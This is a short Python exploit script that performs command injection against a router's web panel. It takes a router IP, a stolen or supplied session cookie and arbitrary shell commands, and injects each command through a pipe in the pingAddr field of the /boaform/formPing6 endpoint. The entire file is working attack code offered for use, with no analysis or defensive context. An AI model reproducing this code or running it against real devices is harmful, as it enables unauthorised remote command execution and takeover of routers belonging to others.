#!/usr/bin/env python3
#This software is licensed under MIT
#Copyright goes to: ma1de (2025)
#This software comes with absolutely no warranty
import requests
import threading

def main():
    start()

def execute_command(address, token, commands):
    headers = {'Cookie': f'sessionid={token}'}

    for command in commands:
        data = f'pingAddr=::+|+{command.replace(' ', '+')}&wanif=65535'
        response = requests.post(f'http://{address}/boaform/formPing6', data=data, headers=headers)
        print(response.content)

def start():
    supplied_address = input("Please supply your vulnerable router IP address: ")

    supplied_token = input("Please supply the sessionid for the web panel: ")

    supplied_command = input("Supply commands to execute, when done type fi: ")

    supplied_commands = []

    while supplied_command != 'fi':
        supplied_commands.append(supplied_command)
        supplied_command = input("Supply commands to execute, when done type fi: ")

    thread = threading.Thread(target=execute_command, args=(supplied_address, supplied_token, supplied_commands))
    thread.start()

if __name__ == "__main__":
    main()